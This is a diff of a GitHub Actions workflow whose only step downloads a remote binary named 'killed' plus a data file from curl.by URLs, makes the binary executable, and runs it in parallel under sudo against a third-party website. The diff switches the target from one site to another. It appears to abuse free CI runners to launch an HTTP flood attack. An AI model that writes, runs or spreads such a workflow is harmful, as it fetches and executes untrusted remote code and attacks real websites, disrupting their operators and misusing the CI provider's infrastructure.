@@ -15,12 +15,12 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/08xBx/killed
-          wget https://curl.by/MGXWb/fres.txt
+          wget https://curl.by/aGTUl/killed
+          wget https://curl.by/s3de6/fres.txt
           chmod +x killed
           PIDS=()
           for i in {1..2}; do
-            sudo timeout 105 ./killed POST https://kuropanel.com/index.html fres.txt 100 250 10 &
+            sudo timeout 105 ./killed GET https://xhamster.com/ fres.txt 100 250 10 &
             PIDS+=($!)
           done
           
